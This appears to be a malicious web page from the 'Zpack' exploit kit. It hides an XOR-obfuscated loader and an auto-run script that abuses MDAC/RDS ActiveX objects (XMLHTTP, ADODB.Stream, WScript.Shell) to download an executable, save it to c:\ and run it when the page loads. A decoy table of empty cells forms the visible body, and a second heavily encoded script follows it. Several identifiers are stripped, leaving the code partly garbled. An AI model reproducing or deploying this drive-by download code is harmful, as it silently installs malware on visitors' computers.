<!--hppage status="protected"-->
<!--HTML--><!--HEAD--><SCRIPT LANGUAGE="JavaScript"><!--
document.write(unescape("%3C%53%43%52%49%50%54%20%4C%41%4E%47%55%41%47%45%3D%22%4A%61%76%61%53%63%72%69%70%74%22%3E%3C%21%2D%2D%0D%0A%68%70%5F%6F%6B%3D%74%72%75%65%3B%66%75%6E%63%74%69%6F%6E%20%68%70%5F%64%30%31%28%73%29%7B%69%66%28%21%68%70%5F%6F%6B%29%72%65%74%75%72%6E%3B%76%61%72%20%6F%3D%22%22%2C%61%72%3D%6E%65%77%20%41%72%72%61%79%28%29%2C%6F%73%3D%22%22%2C%69%63%3D%30%3B%66%6F%72%28%69%3D%30%3B%69%3C%73%2E%6C%65%6E%67%74%68%3B%69%2B%2B%29%7B%63%3D%73%2E%63%68%61%72%43%6F%64%65%41%74%28%69%29%3B%69%66%28%63%3C%31%32%38%29%63%3D%63%5E%32%3B%6F%73%2B%3D%53%74%72%69%6E%67%2E%66%72%6F%6D%43%68%61%72%43%6F%64%65%28%63%29%3B%69%66%28%6F%73%2E%6C%65%6E%67%74%68%3E%38%30%29%7B%61%72%5B%69%63%2B%2B%5D%3D%6F%73%3B%6F%73%3D%22%22%7D%7D%6F%3D%61%72%2E%6A%6F%69%6E%28%22%22%29%2B%6F%73%3B%64%6F%63%75%6D%65%6E%74%2E%77%72%69%74%65%28%6F%29%7D%2F%2F%2D%2D%3E%3C%2F%53%43%52%49%50%54%3E"));//-->
</SCRIPT>
<script language="JavaScript">

// Zpack. Created by Krey coders team.
// ICQ 180-241
// Light edition
include("./crypt.php");
	function ()
	{
		var  = "abcdefghiklmnopqrstuvwxyz";
		var  = ;
		var  = '';
		for (var i=0; i<; i++)
		{
			var  = Math.floor(Math.random() * .length);
			 += .substring(,+1);
		}
		return ;
	}

	function (CLSID, name)
	{
		var result = null;

		                try { eval('result = CLSID.CreateObject(name)') }         catch(e){}
		if (! result) { try { eval('result = CLSID.CreateObject(name, "")') }     catch(e){} }
		if (! result) { try { eval('result = CLSID.CreateObject(name, "", "")') } catch(e){} }
		if (! result) { try { eval('result = CLSID.GetObject("", name)') }        catch(e){} }
		if (! result) { try { eval('result = CLSID.GetObject(name, "")') }        catch(e){} }
		if (! result) { try { eval('result = CLSID.GetObject(name)') }            catch(e){} }

		return(result);
	}

	function (xml, url)
	{
		try
		{
			xml.open("GET", url, false);
			xml.send(null);
		} catch(e) { return 0; }

		return xml.responseBody;
	}

	function (o, name, data)
	{
		try
		{
			o.Type = 1;
			o.Mode = 3;
			o.Open();
			o.Write(data);
			o.SaveToFile(name, 2);
			o.Close();
		} catch(e) { return 0; }
		return 1;
	}

	function (exec, name, type)
	{
		if (type == 0)
		{
			try { exec.Run(name, 0); return 1; } catch(e) { }
		}
		else
		{
			try { exe.(name); return 1; } catch(e) { }
		}
		return(0);
	}

	function mdac()
	{
		var  = "";
		var  = new Array('{BD96C556-65A3-11D0-983A-00C04FC29E30}', '{BD96C556-65A3-11D0-983A-00C04FC29E36}', '{AB9BCEDD-EC7E-47E1-9322-D4A210617116}', '{0006F033-0000-0000-C000-000000000046}', '{0006F03A-0000-0000-C000-000000000046}', '{6e32070a-766d-4ee6-879c-dc1fa91d2fc3}', '{6414512B-B978-451D-A0D8-FCFDF33E833C}', '{7F5B7F63-F06F-4331-8A26-339E03C0AE3D}', '{06723E09-F4C2-43c8-8358-09FCD1DB0766}', '{639F725F-1B2D-4831-A9FD-874847682010}', '{BA018599-1DB3-44f9-83B4-461454C84BF8}', '{D0C07D56-7C69-43F1-B4A0-25F5A11FAB19}', '{E8CCCDDF-CA28-496b-B050-6C07C962476B}', null);
		var  = new Array(null, null, null);
		var i = 0;
		var n = 0;
		var ret = 0;

		while ([i] && (! [0] || ! [1] || ! [2]) )
		{
			var a = null;

			try
			{
				a = document.createElement("object");
				a.setAttribute("classid", "clsid:" + [i].substring(1, [i].length - 1));
			} catch(e) { a = null; }

			if (a)
			{
				if (! [0])
				{
					[0] = (a, "ms"+"xml2.XM"+"LHTTP");
					if (! [0]) [0] = (a, "Micr"+"osoft.X"+"MLHTTP");
					if (! [0]) [0] = (a, "MSX"+"ML2.Serv"+"erXML"+"HTTP");
				}
				if (! [1])
				{
					[1] = (a, "ADO"+"DB.St"+"ream");
				}
				if (! [2])
				{
					[2] = (a, "WSc"+"ript.Sh"+"ell");
					if (! [2])
					{
						[2] = (a, "Sh"+"ell.Appli"+"cation");
						if ([2]) n=1;
					}
				}
			}
			i++;
		}
		if ([0] && [1] && [2])
		{
			var data = ([0], );

			if (data != 0)
			{
				var name = "c:\\"+(4)+".exe";
				if (([1], name, data) == 1)
				{
					if (([2], name, n) == 1) { ret=1; }
				}
			}
		}
		return ret;
	}

	function Attack()
	{
		mdac();
	}

	Attack();

</script><!--/HEAD--><!--BODY-->
<table width="122" border="1">
  <tr>
    <td width="66"><table width="66" border="1">
      <tr>
        <td width="25"><table width="25" border="1">
          <tr>
            <td width="8">&nbsp;</td>
            <td width="8">&nbsp;</td>
          </tr>
        </table></td>
        <td width="25"><table width="25" border="1">
          <tr>
            <td width="8">&nbsp;</td>
            <td width="8">&nbsp;</td>
          </tr>
        </table></td>
      </tr>
    </table></td>
    <td width="40"><table width="16" border="1">
      <tr>
        <td width="8"><table width="25" border="1">
          <tr>
            <td width="8">&nbsp;</td>
            <td width="8">&nbsp;</td>
          </tr>
        </table></td>
        <td width="23"><table width="25" border="1">
          <tr>
            <td width="8">&nbsp;</td>
            <td width="8">&nbsp;</td>
          </tr>
        </table></td>
      </tr>
    </table></td>
  </tr>
</table>
<NOSCRIPT>To display this page you need a browser with JavaScript support.</NOSCRIPT><!--/BODY--><!--/HTML--><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML>
<HEAD>
<META http-equiv=Content-Type content="text/html; charset=windows-1251">
</HEAD>
<BODY><script language=JavaScript>function dc(x){var l=x.length,b=1024,i,j,r,p=0,s=0,w=0,t=Array(72,0,71,0,40,53,0,0,0,0,49,0,9,46,0,26,8,61,13,31,1,33,52,47,24,0,0,0,0,0,0,23,37,7,3,44,11,21,50,27,69,42,68,64,60,63,35,56,22,54,41,62,51,5,66,48,55,25,0,0,0,34,2,0,28,18,16,32,58,0,4,17,14,38,70,15,20,30,10,67,43,6,59,29,36,12,45,19,39,65,0,0,0,57);for(j=Math.ceil(l/b);j>0;j--){r='';for(i=Math.min(l,b);i>0;i--,l--){w|=(t[x.charCodeAt(p++)-33])<<s;if(s){r+=String.fromCharCode(255^w&255);w>>=8;s-=2}else{s=6}}document.write(r)}}dc("C4~^biZXC4Sjn.ZXCESjEe~YY.eJ8ow..JJwSoaYwJH.wJEqYR2Ya_ZuEJZuEoaYvxMYJReD_HZuHJ~6hNPAl_aAnj%ytBMXvGZOQTP^4lSyh^S^n^Sj_@qy-e-qaR%Al.9Xv.9O4EMYtY%^4G%^Q4t+7O~^cRS^@r-unY%^4G%^Q4wYVbl^4G%Yge2XnqZut.PuH_S^cY-OHTS^H.quHi~jcJ%&ZB-ym.Zyoj2&Vxl6cYPjoTq^oGPAa.%^H0tR@JZRby36Z4t+7x173.S^NJ%^vn-yEJPjQytybTZO3nSjZEtRtoZRFytO@jt&aq-+MJEYFU2+1YsGa@tREOM718M83l2UZ@3YlqqUx4D+a@tR3Ns7isaRFUt8iqvYFy3.2GaRFU2+sGt&ZYvGZ4t+7q1OBet67OPyve2OnlDYg_t8v.~yo.ZDab~jtJ%&ZlZOZ@3Yri-YFywuvyt&aC3YFywSUjt&aEqwa@tRJjt&ZqJqZEtRZ4t+7OPyvetOnlDYg_t8v.~yo.ZDab~jtJ%&aYJAHo-YFUwucNqOa@3Yio-YFU2AtTS^@Gt&aB-uaEtRZ4t+7OPyvew^nlDYg_t8v.~yo.ZDab~jtJ%&ZNSjZ@tRhJZRFU3ycUt&ZY%^Z@3Yv.-YFy2yxjw7Zy2&Vx8^vn%YVew^cqP6i.SYCs2UVxNOcBSOH_S&ZyHRFU2.a@tRJjw7ZHS^oe1+hBwj0rZOxT-u4j~jv_tuvjZ74JSO4RZAhEZu4J-7i0SOZE3j4oZOHnt+7N173.-u002&Vsw^cBSOH_S&@@v2o_tJvnS^H02OcUPj3e9ucRPjMrSjBnt+7OPyve3u4i~jnlDYZCt7hCt7hC%^xePUlyDGc8S6Hjt+7q17wT-^HJ0uPnSuH03u4i~jbUM&Vx8^cYquhRPjQ4t+7l%YtTS^t0S&HnwYVi12oGP6n@%Y3_tOQ.Sub.S6HR~^o.S&cT~uHnt+nl%YtTS^t0S&HnwYViPd7Y~yoRSAQ8~&ViPdtxvOER9U4EMYtY3+Z_ZO44wA4EMYlxMYQT2X4UP^3r2u0r-jEn-+4H~Ymxw&4xPYv.9O3NwX4UP^3RMYmN3qER%Ah^Z7ZR1ubGsAnR18c.Sj443OER97anSy3GEuHJS8ET2&Q02Y6TwUQxMY_bMY0j%yxT2&v.9O3H3+CC3OaR%Al.9XCC2A0e~j5lv7@.%uxrMXtRPYcBa2CYZX~e~^ni~Y0R9OcRPXcYZXVN2Y~eSAxJ~j481u4l-un.~Yae-y@J~j4ySAxJ~Y@C2AcoSjc89OnjZjbeZun^-7H_Sun0Zuv_2jH_-ObeZun^Sj3r3u3^-7lJ9yx0-ydn~^bi-7n.~OnG-AcUZOrTP^hNPAl0t2ZJ9ua.%Acr~YdGZOrTP^cR1%4H-O4s~u3JSyH0PYHJ-yxeZO0.~YQr~YCYZXc4-ubJ-7ER%yZjSunrSy9_2jcoSyQr-Oc8~jcG%unrSy9JZOhCZO9_2OoR~uQG-%@.%ux_wyHT%yab-70nPOcsa7ln~OCCty5N3uhT2uQrSj4lay5yMXcYZXCYZO4CtX&C")</script>